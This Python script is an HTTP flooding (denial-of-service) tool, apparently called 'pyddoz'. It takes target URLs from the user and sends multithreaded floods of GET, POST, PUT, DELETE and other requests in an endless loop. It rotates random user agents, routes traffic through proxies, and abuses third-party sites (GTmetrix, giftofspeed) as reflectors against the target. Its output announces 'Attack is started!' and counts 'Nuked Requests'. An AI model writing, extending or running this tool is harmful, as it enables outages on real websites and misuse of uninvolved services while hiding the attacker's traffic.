#!/usr/bin/env python3

import logging
import json
import proxify
import requests
import random
import resource
import sys
import string
import time
import threading
import urllib3
from colorama import Fore, Back
from fake_useragent import UserAgent
from time import sleep

def show_banner():
    print(Fore.RED + Back.BLACK + r'''
-__ /\\         -_____    -_____          _-___ 
  ||  \\          ' | -,    ' | -,            / 
 /||__|| '\\/\\  /| |  |`  /| |  |`  /'\\    /  
 \||__||  || ;'  || |==||  || |==|| || ||  =/=  
  ||  |,  ||/   ~|| |  |, ~|| |  |, || ||  /    
_-||-_/   |/     ~-____,   ~-____,  \\,/  /-__- 
  ||     (      (         (                     
          -_-                                   
''')

def send_request():
    try:
        global num_success
        global num_failed

        url = random.choice(urls)

        header = {'User-Agent': ua.random, 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Referer': url}
        
        request = requests.Session()
        request.verify = False

        proxy = None

        if (use_proxy == 'y'):
            proxy = proxify.one()
            proxy_protocol = proxy.split(':')[0]
            proxy = {proxy_protocol: proxy}
            logging.info('Selected proxy: ' + str(proxy))

        if (activate_bots == 'y'):
            bot_header = header
            bot_header['Content-Type'] = 'application/x-www-form-urlencoded'
            choice = random.randint(0,1)
            bot_url = bot_urls[choice]
            logging.info('Selected bot URL: ' + bot_url)
            
            if (choice == 0):
                payload = {'page_url': url}
            elif (choice == 1):
                payload = {'url': url}

            try:
                response = request.post(bot_url, timeout=selected_to, headers=bot_header, data=payload, proxies=proxy, allow_redirects=True)
                logging.info('Response code from bot: ' + str(response.status_code))
                global num_bot_requests
                num_bot_requests += 1

            except Exception as exception:
                num_failed += 1
                logging.error('Bot request was failed! - ' + str(exception))
            
            if (only_bots == 'y'):
                return
        
        if (randomize_data == 'y'):
            for data in payload:
                payload.update({data: ''.join(random.sample((string.ascii_letters + string.digits), random.randint(5, max_random)))})
            logging.info('Randomized data: ' + str(payload))

        adapter = requests.adapters.HTTPAdapter(max_retries=num_retries)
        request.mount('http://', adapter)
        request.mount('https://', adapter)

        if (selected_method == 'p'):
            response = request.post(url, timeout=selected_to, headers=header, proxies=proxy, data=payload, allow_redirects=selected_redir)
        elif (selected_method == 'u'):
            response = request.put(url, timeout=selected_to, headers=header, proxies=proxy, data=payload, allow_redirects=selected_redir)
        elif (selected_method == 'g'):
            response = request.get(url, timeout=selected_to, headers=header, proxies=proxy, allow_redirects=selected_redir)
        elif (selected_method == 'o'):
            response = request.options(url, timeout=selected_to, headers=header, proxies=proxy, allow_redirects=selected_redir)
        elif (selected_method == 'h'):
            response = request.head(url, timeout=selected_to, headers=header, proxies=proxy, allow_redirects=selected_redir)
        elif (selected_method == 'd'):
            response = request.delete(url, timeout=selected_to, headers=header, proxies=proxy, allow_redirects=selected_redir)
        else:
            raise ValueError('Invalid method!')
            logging.error('Invalid method!')

        logging.info('Response code: ' + str(response.status_code))
        num_success += 1

    except Exception as exception:
        num_failed += 1
        logging.error('Request was failed! - ' + str(exception))

    return

if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
    logging.basicConfig(filename='pyddoz.log', format='%(asctime)s | %(levelname)s | %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.DEBUG)
    show_banner()
    
    logging.info('Program started!')
    print(Back.RESET + Fore.BLUE + '\nProgram is preparing...', end='')	

    try:
        ua = UserAgent()

    except:
        ua = UserAgent(use_cache_server=False)
         
    print(Fore.BLUE + '\rProgram was started successfully!')

    num_failed = 0
    num_success = 0
    num_bot_requests = 0
    bot_urls = []
    bot_urls.append('https://www.giftofspeed.com/request-checker/')
    bot_urls.append('https://gtmetrix.com/analyze.html')
    urls = []
    randomize_data = 'n'

    selected_urls = str(input(Fore.GREEN + 'Enter URL(s): '))

    for splitted_url in selected_urls.split(' '):
        urls.append(splitted_url)
        logging.info('URL: ' + splitted_url)

    selected_method = str(input('Enter request method GET, POST, PUT, HEAD, OPTIONS, DELETE? [G/P/U/H/O/D]: ')[0].lower())
    logging.info('HTTP request method: ' + selected_method.upper())

    if (selected_method == 'p' or selected_method == 'u'):
        payload = {}
        key_turn = True
        raw_post = str(input('Enter post data: '))
        
        try:
            if ('&' in raw_post): 
                for params in raw_post.split('&'):
                    for param in params.split('='):
                        if key_turn:
                            payload[param] = ''
                            last_key = param
                            key_turn = False
                        else:
                            payload[last_key] = param
                            key_turn = True
            else:
                payload[raw_post.split('=')[0]] = raw_post.split('=')[1]
            
            logging.info('POST or PUT data: ' + payload)

        except:
            payload = 'LEL!'
            logging.error('POST or PUT data could not be understood! Default data configurated as: "' + payload + '"')

        randomize_data = str(input('Do you want to randomize post data? [Y/N]: ')[0].lower())
        logging.info('Randomize data: ' + randomize_data.upper())

        if (randomize_data == 'y'):
            max_random = int(input('Enter maximum length of random alphanumeric strings to create: '))
            logging.info('Maximum length of randomized string: ' + str(max_random))

    activate_bots = str(input('Do you want to activate bots? [Y/N]: ')[0].lower())
    logging.info('Activate Bots: ' + activate_bots.upper())

    if (activate_bots == 'y'):
        only_bots = str(input(Fore.RED + 'Only bots? [Y/N]: ')[0].lower())
        if (only_bots == 'y'):
            logging.warning('Only bots are included!') 
        else:
            pass

    selected_to = float(input(Fore.GREEN + 'Enter timeout second for requests: '))
    logging.info('Timeout: ' + str(selected_to))
    num_threads = int(input('Enter number of threads: '))
    logging.info('Number of threads: ' + str(num_threads))
    sleep_time = float(input('Enter seconds of sleeping between threads: '))
    logging.info('Sleep time between threads: ' + str(sleep_time) + ' seconds.')
    num_retries = int(input('Enter number of retries after a connection failure: '))
    logging.info('Number of retries after failures: ' + str(num_retries))
    use_proxy = str(input('Do you want to use proxy? [Y/N]: ')[0].lower())
    logging.info('Use Proxy?: '  + use_proxy.upper())
    selected_redir = str(input('Do you want to allow redirections? [Y/N]: ')[0].lower())
    logging.info('Allow Redirections?: ' + str(selected_redir))

    if (selected_redir == 'y'):
        selected_redir = True
    else:
        selected_redir = False
  
    start_time = time.time()
    print(Fore.RED + 'Attack is started! Press [CTRL + C] to stop.')
    logging.info('Attack started!')

    while (True):
        try:
            for i in range(num_threads):
                t = threading.Thread(target=send_request)
                t.start()
                sleep(sleep_time)
                elapsed_time = time.time() - start_time
                print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)

            main_thread = threading.currentThread()
            for i in threading.enumerate():
                if i is main_thread:
                    continue
                else:
                    print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
                    i.join()
           
        except KeyboardInterrupt:
            print(Fore.RED + '\nAttack was stopped!')
            logging.info('Attack stopped!')
            main_thread = threading.currentThread()
            print(Fore.RED + 'Threads are exiting...')

            for i in threading.enumerate():
                if i is main_thread:
                    continue
                else:
                    i.join()

            logging.info('Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)))
            print(Fore.BLUE + 'Successfully finished!')
            logging.info('Successfully finished!')
            break